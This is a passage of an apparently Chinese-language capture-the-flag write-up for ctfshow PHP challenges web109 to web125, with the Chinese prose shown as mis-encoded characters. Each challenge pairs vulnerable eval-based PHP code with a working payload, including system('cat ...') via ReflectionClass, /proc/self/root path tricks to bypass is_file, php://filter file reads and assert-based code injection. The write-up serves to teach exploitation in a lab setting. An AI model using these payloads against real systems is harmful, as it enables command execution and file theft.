å…¥çš„æ•°æ®åè½¬åä¸º0x36dï¼ˆ877ï¼‰æ‰èƒ½è¾“å‡ºflag</li><li>å¯ä»¥åˆ©ç”¨00æˆªæ–­ï¼Œåœ¨ç¬¬ä¸€ä¸ªifåˆ¤æ–­æ—¶æˆªæ–­ï¼Œä½¿å¾—æ£€æµ‹å‡ºçš„æ•°æ®åªæœ‰å­—æ¯ï¼Œåœ¨ç¬¬äºŒä¸ªifåˆ¤æ–­æ—¶ï¼Œæ£€æµ‹åè½¬åçš„æ•°æ®ï¼Œå°†å­—æ¯æˆªæ–­ï¼Œä½¿æ•°æ®åªæœ‰æ•°å­—877</li></ul><h1 id="web109-ReflectionClass-system"><a href="#web109-ReflectionClass-system" class="headerlink" title="web109(ReflectionClass(system()))"></a>web109(ReflectionClass(system()))</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v1=ReflectionClass&amp;v2=system(&#39;cat fl36dg.txt&#39;)</code></p><ul><li>ä»ifåˆ¤æ–­ä¸­å¾—å‡ºä¼ å…¥çš„å‚æ•°éœ€ä¸ºå­—æ¯</li><li>ç»è¿‡ä»£ç æ‰§è¡Œï¼Œè¾“å‡ºä¸€ä¸ªæ•°æ®</li><li>å› ä¸ºnewå¯ä»¥å¾—å‡ºï¼Œå¤§æ¦‚ç‡æ˜¯è¾“å‡ºä¸€ä¸ªç±»</li><li>æ‰€ä»¥å¯ä»¥åˆ©ç”¨åå°„ç±»<code>ReflectionClass(system())</code>åŠ å‘½ä»¤æ¥æ“ä½œ</li></ul><h1 id="web110-FilesystemIterator-getcwd"><a href="#web110-FilesystemIterator-getcwd" class="headerlink" title="web110(FilesystemIterator(getcwd()))"></a>web110(FilesystemIterator(getcwd()))</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v1=FilesystemIterator&amp;v2=getcwd è®¿é—®æ–‡ä»¶</code></p><ul><li>è¿‡æ»¤äº†ä¸€å¤§å †ä¸œè¥¿ï¼Œä¸Šé“é¢˜çš„payloadä¸èƒ½ç”¨äº†</li><li>åˆ©ç”¨å†…ç½®ç±»è¯»æ–‡ä»¶</li><li><code>FilesystemIterator(getcwd())</code>è¿”å›ã€<ul><li>FilesystemIteratorè·å–æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</li><li>getcwd()å‡½æ•°ï¼šè·å–å½“å‰å·¥ä½œç›®å½• è¿”å›å½“å‰å·¥ä½œç›®å½•</li></ul></li><li>å¾—åˆ°æ–‡ä»¶åå­—åï¼Œç›´æ¥è®¿é—®è¯¥æ–‡ä»¶</li></ul><h1 id="web111-GLOBALS"><a href="#web111-GLOBALS" class="headerlink" title="web111($GLOBALS)"></a>web111($GLOBALS)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v1=ctfshow&amp;v2=GLOBALS</code></p><ul><li>æ ¹æ®ä»£ç å‘ç°å”¯ä¸€å¯èƒ½å¾—åˆ°flagçš„åœ°æ–¹åœ¨getflagè¿™ä¸ªæ–¹æ³•é‡Œ</li><li>ä¸¤ä¸ªifå¯¹ä¼ å…¥çš„æ•°æ®åˆ†åˆ«è¿‡æ»¤äº†ä¸€å¤§å †ä¸œè¥¿</li><li>ç¬¬ä¸‰ä¸ªifå‘ç°v1çš„å€¼éœ€ä¸ºctfshowæ‰èƒ½æ‰§è¡Œè¿™ä¸ªgetflagæ–¹æ³•</li><li>åœ¨getflagæ–¹æ³•é‡Œ<ul><li>evalå°†ä¸¤ä¸ªå˜é‡è¿›è¡Œäº†å¼•ç”¨ï¼Œæ‰€ä»¥ç¬¬äºŒä¸ªå‚æ•°æˆ‘ä»¬ä¼ å…¨å±€å˜é‡</li><li>é€šè¿‡å˜é‡è¦†ç›–ï¼Œä½¿è¾“å‡ºçš„æ•°æ®ä¸º$GLOBALS</li></ul></li></ul><h1 id="web112-is-file"><a href="#web112-is-file" class="headerlink" title="web112(is_file)"></a>web112(is_file)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure><ul><li>is_file()ï¼šåˆ¤æ–­ç»™å®šæ–‡ä»¶åæ˜¯å¦ä¸ºä¸€ä¸ªæ­£å¸¸çš„æ–‡ä»¶ï¼Œå‚æ•°ä¸ºæ–‡ä»¶è·¯å¾„</li><li><p>åœ¨linuxä¸­/proc/self/rootæ˜¯æŒ‡å‘æ ¹ç›®å½•çš„</p></li><li><p>å¤šæ¬¡ä¸Šé¢çš„æ“ä½œå¯ä»¥ç»•è¿‡is_file</p></li></ul><h1 id="web113-is-file"><a href="#web113-is-file" class="headerlink" title="web113(is_file)"></a>web113(is_file)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure><h1 id="web114-php-filter"><a href="#web114-php-filter" class="headerlink" title="web114(php://filter/)"></a>web114(php://filter/)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?file=php://filter/resource=flag.php</code></p><ul><li>å‘ç°rootè¢«è¿‡æ»¤äº†ï¼Œè¯»å–æ–‡ä»¶ç”¨ä¼ªåè®®</li></ul><h1 id="web115-is-numericï¼Œstr-replaceï¼Œtrim"><a href="#web115-is-numericï¼Œstr-replaceï¼Œtrim" class="headerlink" title="web115(is_numericï¼Œstr_replaceï¼Œtrim)"></a>web115(is_numericï¼Œstr_replaceï¼Œtrim)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125; hacker!!!</span><br></pre></td></tr></table></figure><p><code>payload: ?num=%0c36</code></p><ul><li>str_replace($search ,$replace , $subject)ï¼š<ul><li>å‚æ•°ï¼šç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç›®æ ‡å­—ç¬¦ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦æ›¿æ¢çš„å­—ç¬¦ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯è¿›è¡Œæ›¿æ¢çš„åŸå­—ç¬¦ä¸²</li><li>è¿”å›å€¼ï¼šä¸€ä¸ªå­—ç¬¦ä¸²æˆ–è€…æ•°ç»„</li></ul></li><li>trim()ï¼šå»é™¤å­—ç¬¦ä¸²é¦–å°¾å¤„çš„ç©ºç™½å­—ç¬¦</li><li>is_numeric()å¯ä»¥ç”¨<code>ç©ºæ ¼+æ•°å­—</code>ç»•è¿‡ä½†æ˜¯trimæŠŠç©ºç™½å­—ç¬¦è¿‡æ»¤äº†<ul><li>é‚£ä¹ˆå¯ä»¥ä½¿ç”¨<code>%0c</code>ç»•è¿‡trim</li></ul></li><li><code>$num!==&#39;36&#39;</code>å’Œ<code>$num==&#39;36&#39;</code>åŒºåˆ«ï¼š<ul><li><code>!==</code>ï¼šåªè¦ç±»å‹ä¸åŒå°±ä¸å…¨ç­‰</li></ul></li><li>æ‰€ä»¥åŠ ä¸Š<code>%0c</code>æ¢é¡µç¬¦ï¼Œåœ¨<code>==</code><strong>è¿›è¡Œç±»å‹è½¬æ¢</strong>ï¼Œæ‰€æœ‰<code>%0c36</code>ä¼šè¢«è½¬æ¢ä¸ºæ•°å€¼36ï¼Œç»“æœtrueï¼›åœ¨<code>!==</code><strong>ä¸è¿›è¡Œç±»å‹è½¬æ¢</strong>ï¼Œæ‰€ä»¥å­—ç¬¦ä¸²å’Œæ•°å€¼æ¯”è¾ƒï¼Œç±»å‹ä¸åŒï¼Œç»“æœtrueã€‚</li></ul><h1 id="web123-gt"><a href="#web123-gt" class="headerlink" title="web123([=&gt;_)"></a>web123([=&gt;_)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: fun=echo $flag&amp;CTF[SHOW=1&amp;CTF[SHOW.COM=1</code></p><ul><li><code>!isset($_GET[&#39;fl0g&#39;])</code>å’Œ<code>$fl0g===&quot;flag_give_me&quot;</code>å†²çªï¼š<ul><li>æ‰€ä»¥GETä¼ å‚ä¸èƒ½ä¼ å‚æ•°ï¼Œè€Œä¸”æºç è‡ªå¸¦çš„è¾“å‡ºflagä¹Ÿä¸èƒ½åˆ©ç”¨ï¼Œèƒ½åˆ©ç”¨çš„åªæœ‰å®ƒæä¾›çš„evalå‡½æ•°</li></ul></li></ul><blockquote><p>PHPå°†æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆåœ¨URLæˆ–æ­£æ–‡ä¸­ï¼‰è½¬æ¢ä¸ºå†…éƒ¨<code>$_GET</code>æˆ–çš„å…³è”æ•°ç»„<code>$_POST</code>ã€‚å¦‚ï¼š<code>/?CTF=ctf</code>å˜æˆ<code>Array([CTF] =&gt; &quot;ctf&quot;)</code>ã€‚<br>æŸ¥è¯¢å­—ç¬¦ä¸²åœ¨è§£æçš„è¿‡ç¨‹ä¸­ä¼šåˆ é™¤ç©ºç™½ç¬¦ï¼ŒåŒæ—¶å°†æŸäº›å­—ç¬¦åˆ é™¤æˆ–ç”¨ä¸‹åˆ’çº¿ä»£æ›¿ã€‚å¦‚ï¼Œ<code>/?CTF[SHOW=42</code>ä¼šè½¬æ¢ä¸º<code>Array([CTF_SHOW] =&gt; 42)</code>ã€‚</p></blockquote><h1 id="web125-SERVER-â€˜argvâ€™"><a href="#web125-SERVER-â€˜argvâ€™" class="headerlink" title="web125($_SERVER[â€˜argvâ€™])"></a>web125($_SERVER[â€˜argvâ€™])</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?$fl0g=flag_give_me    fun=assert($a[0])&amp;CTF[SHOW=1&amp;CTF[SHOW.COM=1</code></p><ul><li>ç½‘é¡µæ¨¡å¼ä¸‹ï¼š<br><code>$_SERVER[â€˜argvâ€™][0] = 